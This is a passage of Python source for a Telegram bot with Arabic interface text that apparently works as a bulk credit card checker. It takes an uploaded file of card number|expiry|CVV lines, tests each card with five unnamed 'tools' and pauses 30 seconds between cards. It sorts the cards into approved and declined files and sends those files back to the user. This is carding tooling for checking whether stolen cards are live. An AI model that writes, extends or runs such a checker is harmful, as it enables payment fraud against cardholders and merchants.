            InlineKeyboardButton("📁 النتائج", callback_data="show_results")
        ],
        [
            InlineKeyboardButton("🧹 تنظيف", callback_data="cleanup"),
            InlineKeyboardButton("❓ مساعدة", callback_data="help")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

async def auto_status_updater(chat_id, bot):
    global checking_active, stop_checking, stats
    while checking_active and not stop_checking:
        await asyncio.sleep(30)
        if checking_active and not stop_checking:
            stats['last_update_time'] = time.time()
            await send_status_update(chat_id, bot)

def worker_single_file(chat_id, bot):
    """وظيفة المعالجة من ملف abood.txt مع الفحص المتعدد"""
    global current_chat_id, current_bot, stop_checking, checking_active, stats, auto_update_task
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    except:
        loop = asyncio.get_event_loop()
    
    current_chat_id = chat_id
    current_bot = bot
    stop_checking = False
    checking_active = True
    
    stats = {
        'total': 0,
        'checked': 0,
        'approved': 0,
        'approved_1tool': 0,
        'approved_2tools': 0,
        'approved_3tools': 0,
        'declined': 0,
        'errors': 0,
        'start_time': time.time(),
        'current_account': 0,
        'total_accounts': 0,
        'current_account_cards': 0,
        'total_account_cards': 0,
        'current_email': '',
        'current_password': '',
        'last_update_time': time.time()
    }
    
    try:
        if not os.path.exists("abood.txt"):
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt غير موجود!", reply_markup=get_control_keyboard()),
                loop
            )
            checking_active = False
            return False
            
        with open("abood.txt", "r", encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lines:
            asyncio.run_coroutine_threadsafe(
                bot.send_message(chat_id=chat_id, text="❌ ملف abood.txt فارغ!"),
                loop
            )
            checking_active = False
            return False
        
        stats['total'] = len(lines)
        cards_per_account = 3
        stats['total_accounts'] = (len(lines) + cards_per_account - 1) // cards_per_account
        
        start_message = f"""
╔══════════════════════════════════╗
║        🔍 *بدء الفحص*            ║
╠══════════════════════════════════╣
║ 📊 *ملخص البطاقات:*               ║
║ ┌────────────────────────────┐   ║
║ │ 📁 الإجمالي:      {stats['total']} بطاقة  ║
║ │ 🛠️ الأدوات:       5 أدوات    ║
║ │ ✅ النجاح:        3 أدوات فما فوق ║
║ └────────────────────────────┘   ║
╚══════════════════════════════════╝"""

        asyncio.run_coroutine_threadsafe(
            bot.send_message(
                chat_id=chat_id,
                text=start_message,
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            ),
            loop
        )
        
        auto_update_task = asyncio.run_coroutine_threadsafe(
            auto_status_updater(chat_id, bot),
            loop
        )
        
        approved_list = []
        
        for i, cc_line in enumerate(lines, 1):
            if stop_checking:
                break
            
            stats['current_account'] = (i - 1) // cards_per_account + 1
            stats['current_account_cards'] = i
            
            print(f"\n{Fore.WHITE}[{i}/{stats['total']}] جاري فحص: {cc_line}")
            
            # فحص البطاقة بجميع الأدوات
            results = check_card_all_tools(cc_line)
            
            # حساب النتيجة
            final_status, final_message = calculate_card_score(results)
            
            stats['checked'] += 1
            
            if final_status == 'APPROVED_3TOOLS':
                stats['approved_3tools'] += 1
                stats['approved'] += 1
                asyncio.run_coroutine_threadsafe(
                    send_approved_instant(cc_line, results, chat_id, bot, 
                                        stats['current_account'], stats['total_accounts'],
                                        stats['current_account_cards'], cards_per_account),
                    loop
                )
                with open("approved_3tools.txt", "a", encoding="utf-8") as f:
                    f.write(f"{cc_line} - نجحت في 3 أدوات\n")
                    
            elif final_status == 'APPROVED_2TOOLS':
                stats['approved_2tools'] += 1
                stats['approved'] += 1
                with open("approved_2tools.txt", "a", encoding="utf-8") as f:
                    f.write(f"{cc_line} - نجحت في أداتين\n")
                    
            elif final_status == 'APPROVED_1TOOL':
                stats['approved_1tool'] += 1
                stats['approved'] += 1
                with open("approved_1tool.txt", "a", encoding="utf-8") as f:
                    f.write(f"{cc_line} - نجحت في أداة واحدة\n")
                    
            else:
                stats['declined'] += 1
                asyncio.run_coroutine_threadsafe(
                    send_declined_message(cc_line, results, chat_id, bot,
                                        stats['current_account'], stats['total_accounts'],
                                        stats['current_account_cards'], cards_per_account),
                    loop
                )
                with open("declined.txt", "a", encoding="utf-8") as f:
                    f.write(f"{cc_line} - فشلت في جميع الأدوات\n")
            
            # إرسال تحديث كل 3 بطاقات
            if i % 3 == 0:
                asyncio.run_coroutine_threadsafe(
                    send_status_update(chat_id, bot),
                    loop
                )
            
            # انتظار بين البطاقات
            if i < stats['total'] and not stop_checking:
                wait_time = 30
                print(f"{Fore.BLUE}⏳ انتظار {wait_time} ثانية...")
                
                for _ in range(wait_time):
                    if stop_checking:
                        break
                    time.sleep(1)
        
        # إرسال النتائج النهائية
        if not stop_checking:
            final_message = f"""
╔══════════════════════════════════╗
║     🎉 *اكتمل الفحص!* 🎉        ║
╠══════════════════════════════════╣
║ 📊 *النتائج النهائية:*           ║
╠══════════════════════════════════╣
║ 📁 الإجمالي:        {stats['total']}      ║
╠══════════════════════════════════╣
║ ✅ 3 أدوات:         {stats['approved_3tools']}      ║
║ ✅ أداتين:          {stats['approved_2tools']}      ║
║ ✅ أداة واحدة:      {stats['approved_1tool']}      ║
║ ❌ المرفوضة:        {stats['declined']}      ║
╚══════════════════════════════════╝"""
            
            asyncio.run_coroutine_threadsafe(
                bot.send_message(
                    chat_id=chat_id,
                    text=final_message,
                    parse_mode='Markdown',
                    reply_markup=get_control_keyboard()
                ),
                loop
            )
        
        checking_active = False
        if auto_update_task:
            auto_update_task.cancel()
        return True
        
    except Exception as e:
        print(f"{Fore.RED}حصل خطأ: {str(e)}")
        import traceback
        traceback.print_exc()
        asyncio.run_coroutine_threadsafe(
            bot.send_message(chat_id=chat_id, text=f"❌ حدث خطأ: {str(e)[:200]}", reply_markup=get_control_keyboard()),
            loop
        )
        checking_active = False
        return False


# ==================== دوال البوت (محدثة) ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = """
╔══════════════════════════════════╗
║     🤖 *مرحباً بك في*            ║
║    *بوت فحص البطاقات v3.0*       ║
╠══════════════════════════════════╣
║ 📁 أرسل لي ملف `abood.txt`        ║
║    لبدء الفحص المتعدد            ║
╠══════════════════════════════════╣
║ ✨ *مميزات البوت:*                ║
║ • فحص بـ 5 أدوات مختلفة         ║
║ • تصنيف البطاقات حسب النجاح     ║
║ • بطاقة صالحة = نجحت في 3 أدوات ║
║ • إحصائيات متقدمة                ║
╚══════════════════════════════════╝

📝 *صيغة الملف المطلوبة:*
`4111111111111111|12|2025|123`"""
    
    await update.message.reply_text(
        welcome_msg, 
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    global checking_active, stop_checking, checking_thread, stats, auto_update_task
    
    if query.data == "start_scan":
        if checking_active:
            await query.edit_message_text(
                text="⚠️ *الفحص قيد التشغيل بالفعل*",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
        else:
            if not os.path.exists("abood.txt"):
                await query.edit_message_text(
                    text="❌ *ملف abood.txt غير موجود*\nالرجاء إرسال الملف أولاً",
                    parse_mode='Markdown',
                    reply_markup=get_control_keyboard()
                )
            else:
                await query.edit_message_text(
                    text="🔄 *جاري بدء الفحص المتعدد...*\nسيتم فحص كل بطاقة بـ 5 أدوات مختلفة",
                    parse_mode='Markdown'
                )
                checking_thread = threading.Thread(
                    target=worker_single_file,
                    args=(query.message.chat_id, context.bot)
                )
                checking_thread.daemon = True
                checking_thread.start()
    
    elif query.data == "stop_scan":
        if checking_active:
            keyboard = [
                [
                    InlineKeyboardButton("✅ نعم، أوقف", callback_data="confirm_stop"),
                    InlineKeyboardButton("❌ لا، استمر", callback_data="cancel_stop")
                ]
            ]
            await query.edit_message_text(
                text="⚠️ *هل أنت متأكد من إيقاف الفحص؟*",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text(
                text="⏸️ *لا يوجد فحص قيد التشغيل*",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "confirm_stop":
        stop_checking = True
        if auto_update_task:
            auto_update_task.cancel()
        await query.edit_message_text(
            text="⏹️ *جاري إيقاف الفحص...*",
            parse_mode='Markdown'
        )
    
    elif query.data == "cancel_stop":
        await query.edit_message_text(
            text="✅ *تم إلغاء الإيقاف*\nالفحص مستمر",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "show_status":
        await send_status_update(query.message.chat_id, context.bot)
        await query.delete()
    
    elif query.data == "show_results":
        keyboard = [
            [
                InlineKeyboardButton("✅ 3 أدوات", callback_data="get_3tools"),
                InlineKeyboardButton("✅ أداتين", callback_data="get_2tools")
            ],
            [
                InlineKeyboardButton("✅ أداة واحدة", callback_data="get_1tool"),
                InlineKeyboardButton("❌ مرفوضة", callback_data="get_declined")
            ],
            [
                InlineKeyboardButton("🔙 رجوع", callback_data="back_to_menu")
            ]
        ]
        await query.edit_message_text(
            text="📁 *اختر نوع النتائج:*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif query.data == "get_3tools":
        if os.path.exists("approved_3tools.txt") and os.path.getsize("approved_3tools.txt") > 0:
            with open("approved_3tools.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="approved_3tools.txt",
                    caption="✅ بطاقات صالحة (نجحت في 3 أدوات)"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_2tools":
        if os.path.exists("approved_2tools.txt") and os.path.getsize("approved_2tools.txt") > 0:
            with open("approved_2tools.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="approved_2tools.txt",
                    caption="⚠️ بطاقات محتملة (نجحت في أداتين)"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_1tool":
        if os.path.exists("approved_1tool.txt") and os.path.getsize("approved_1tool.txt") > 0:
            with open("approved_1tool.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="approved_1tool.txt",
                    caption="❓ بطاقات مشكوك فيها (نجحت في أداة واحدة)"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "get_declined":
        if os.path.exists("declined.txt") and os.path.getsize("declined.txt") > 0:
            with open("declined.txt", "rb") as f:
                await context.bot.send_document(
                    chat_id=query.message.chat_id,
                    document=f,
                    filename="declined.txt",
                    caption="❌ بطاقات مرفوضة"
                )
        else:
            await query.edit_message_text(
                text="📭 لا توجد بطاقات",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
    
    elif query.data == "cleanup":
        files_to_delete = ["approved_3tools.txt", "approved_2tools.txt", "approved_1tool.txt", 
                          "declined.txt", "abood.txt"]
        deleted = []
        
        for file in files_to_delete:
            if os.path.exists(file):
                os.remove(file)
                deleted.append(file)
        
        for temp_file in Path(TEMP_DIR).glob("*.txt"):
            temp_file.unlink()
            deleted.append(str(temp_file))
        
        global stats
        stats = {
            'total': 0, 'checked': 0, 'approved': 0,
            'approved_1tool': 0, 'approved_2tools': 0, 'approved_3tools': 0,
            'declined': 0, 'errors': 0, 'start_time': 0,
            'current_account': 0, 'total_accounts': 0,
            'current_account_cards': 0, 'total_account_cards': 0,
            'current_email': '', 'current_password': '', 'last_update_time': 0
        }
        
        await query.edit_message_text(
            text=f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "help":
        help_text = """
╔══════════════════════════════════╗
║     📚 *المساعدة*                ║
╠══════════════════════════════════╣
║ *طريقة العمل:*                   ║
║ 1️⃣ يتم فحص كل بطاقة بـ 5 أدوات ║
║ 2️⃣ تحتاج 3 أدوات للصلاحية       ║
║ 3️⃣ تصنيف النتائج حسب عدد النجاح ║
╠══════════════════════════════════╣
║ *تصنيف البطاقات:*                ║
║ ✅ 3 أدوات: صالحة تماماً         ║
║ ⚠️ أداتين: محتملة                ║
║ ❓ أداة واحدة: مشكوك فيها        ║
║ ❌ 0 أدوات: مرفوضة               ║
╚══════════════════════════════════╝"""
        
        await query.edit_message_text(
            text=help_text,
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
    
    elif query.data == "back_to_menu":
        await query.edit_message_text(
            text="🔍 *القائمة الرئيسية*",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    await update.message.reply_text("📥 جاري استلام الملف...")
    
    try:
        file = await update.message.document.get_file()
        
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text(
                "❌ الملف يجب أن يكون بصيغة .txt",
                reply_markup=get_control_keyboard()
            )
            return
        
        if update.message.document.file_name.lower() != "abood.txt":
            await update.message.reply_text(
                "❌ اسم الملف يجب أن يكون `abood.txt` بالضبط",
                parse_mode='Markdown',
                reply_markup=get_control_keyboard()
            )
            return
        
        temp_file_path = os.path.join(TEMP_DIR, f"abood_{user_id}_{int(time.time())}.txt")
        await file.download_to_drive(temp_file_path)
        shutil.copy2(temp_file_path, "abood.txt")
        
        with open("abood.txt", "r", encoding='utf-8', errors='ignore') as f:
            lines = [l.strip() for l in f.readlines() if l.strip()]
        
        await update.message.reply_text(
            f"✅ *تم استلام الملف بنجاح!*\n📁 عدد البطاقات: {len(lines)}\n\nسيتم فحص كل بطاقة بـ 5 أدوات مختلفة\nاضغط ▶️ *بدء الفحص* للبدء",
            parse_mode='Markdown',
            reply_markup=get_control_keyboard()
        )
        
    except Exception as e:
        await update.message.reply_text(
            f"❌ حدث خطأ: {str(e)[:200]}",
            reply_markup=get_control_keyboard()
        )

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_status_update(update.effective_chat.id, context.bot)

async def cleanup_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files_to_delete = ["approved_3tools.txt", "approved_2tools.txt", "approved_1tool.txt", 
                      "declined.txt", "abood.txt"]
    deleted = []
    
    for file in files_to_delete:
        if os.path.exists(file):
            os.remove(file)
            deleted.append(file)
    
    for temp_file in Path(TEMP_DIR).glob("*.txt"):
        temp_file.unlink()
        deleted.append(str(temp_file))
    
    global stats
    stats = {
        'total': 0, 'checked': 0, 'approved': 0,
        'approved_1tool': 0, 'approved_2tools': 0, 'approved_3tools': 0,
        'declined': 0, 'errors': 0, 'start_time': 0,
        'current_account': 0, 'total_accounts': 0,
        'current_account_cards': 0, 'total_account_cards': 0,
        'current_email': '', 'current_password': '', 'last_update_time': 0
    }
    
    await update.message.reply_text(
        f"🧹 *تم تنظيف {len(deleted)} ملف/ملفات*",
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
╔══════════════════════════════════╗
║     📚 *المساعدة*                ║
╠══════════════════════════════════╣
║ *الأزرار المتاحة:*               ║
║ ▶️ بدء الفحص - فحص متعدد         ║
║ ⏹️ إيقاف - أوقف الفحص           ║
║ 📊 الحالة - عرض الإحصائيات       ║
║ 📁 النتائج - تحميل الملفات       ║
║ 🧹 تنظيف - حذف الملفات           ║
╠══════════════════════════════════╣
║ *الأوامر النصية:*                ║
║ /start - القائمة الرئيسية        ║
║ /status - عرض الحالة             ║
║ /cleanup - تنظيف الملفات         ║
║ /help - عرض المساعدة             ║
╚══════════════════════════════════╝"""
    
    await update.message.reply_text(
        help_text,
        parse_mode='Markdown',
        reply_markup=get_control_keyboard()
    )

def main():
    keep_alive()
    os.makedirs(TEMP_DIR, exist_ok=True)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("cleanup", cleanup_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 البوت يعمل...")
    print("📊 وضع الفحص المتعدد: 5 أدوات")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
